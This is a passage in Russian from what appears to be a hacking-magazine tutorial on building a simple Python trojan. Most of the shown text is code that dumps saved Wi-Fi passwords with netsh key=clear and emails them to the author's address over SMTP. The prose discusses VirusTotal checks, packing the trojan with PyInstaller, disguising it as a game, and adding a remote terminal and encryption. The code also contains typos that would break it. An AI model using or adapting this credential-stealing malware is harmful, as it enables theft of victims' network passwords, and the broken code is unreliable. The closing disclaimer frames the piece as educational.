Если распарсить вывод выше и подставить имя сети в команду netsh wlan show profile [имя сети]
ey=clear, результат будет как на картинке. Его можно разобрать и вытащить пароль от сети. 
Результат проверки нашего творчества на VirusTotal показан. (Но iDONi ничего не понимает.)

Осталась одна проблема: наша изначальная задумка была забрать пароли себе, а не 
показывать их пользователю. Исправим же это.

Допишем еще пару строк в скрипт, где отрабатываем наши команды из сети.

if server_coomand == 'Wi-Fi':
	data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('cp866').
	split('\n')
	Wi-Fis = [line.split(':')[1][1:-1] for line in data if 'All profiles users' in line]
	for Wi-Fi in Wi-Fis:
		results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', Wi-Fi,
							'key=clear']).decode('cp866').split('\n')
		results = [line.split(':')[1][1:-1] for lin in results if 'Key' in line]
		try:
			email='xakepmail@yandx.ru'
			password = '***'
			dest_email = 'demo@xakep.ru'
			subject = 'Wi-Fi'
			email_text = (f'Name: (Wi-Fi), Password {results[0]}')
			message = 'From: ()\n To: ()\nSubject: ()\n\n()'.format(email, dest_email,
										subject,email_text)
			server = smtp.SMTP_SSL('smtp.yandex.com')
			server.set_debuglevel(1)
			server.ehlo(email)
			server.login(email, password)
			server.auth_plain()
			server.sendmail(email, dest_email, message)
			server.quit()
		except IndexError:
			email = 'xakpmail@yandex.ru'
			password = '***'
			dest_email = 'demo@xakep.ru'
			subject = 'Wi-Fi'
			email_text = (f'Nam:(Wi-Fi), Password not found!')
			message = 'From()\nTo:()\nSubject:()\n\n()'.format(email,dest_email,
									subject, email_text)
			server = smtp.SMTP_SSL('smtp.yendex.com')
			server.set_debuglevel(1)
			server.ehlo(email)
			server.login(email, password)
			server.auth_plain()
			server.sendmail(email,dest_email,message)
			server.quit()	

Этот скрипт прост как два рубля, и ожидает увидеть русскоязычную систему. На других языках
это не сработает, но исправить поведение скрипта можно простым выбором разделителя из словаря, 
где ключ - обнаруженный на компьютере язык, а значение - требуемая фраза на нужном языке.

Все команды этого скрипта уже подробно разобраны, так что я не буду повторяться,
а просто покажу скриншот из своей почты. (Конечно, iDONi, этого делать не будет,
почему, потому что не умеет).

Доработки.
Конечно, тут можно доработать прмерно все - от защиты канала передачи до защиты самого кода
нашего вредоноса. Методы связи с управляющими серверами злоумышленника тоже обычно
используется другие, а работа вредоноса не зависит от языка операционной системы.
И конечно, сам вирус очень желательно упаковать с помощью PyInstaller, чтобы не тянуть
с собой на машин жертвы питон и все зависимости. Игра, которая требует для своего запуска
установить модуль для работы с почтой - что может внушать большее доверие?

Заключение
Сегодняшний троян настолько прост, что его никак нельзя назвать боевым. Тем не менее он полезен
для изучения основ языка Python и понимания алгоритмов работы более сложных вредоносных
программ. Мы надеемся, что ты уважаешь закон, а полученные знания о троянах тебе никогда
не понадобятся.

В качестве домашнего задания рекомендую попробовать реализовать двусторонний терминал и
шифрование данных хотя бы с помощью XOR. Такой троян уже будет куда интереснее, но,
безусловно, испольщовать его in the wild мы не призываем. Будь аккуратен!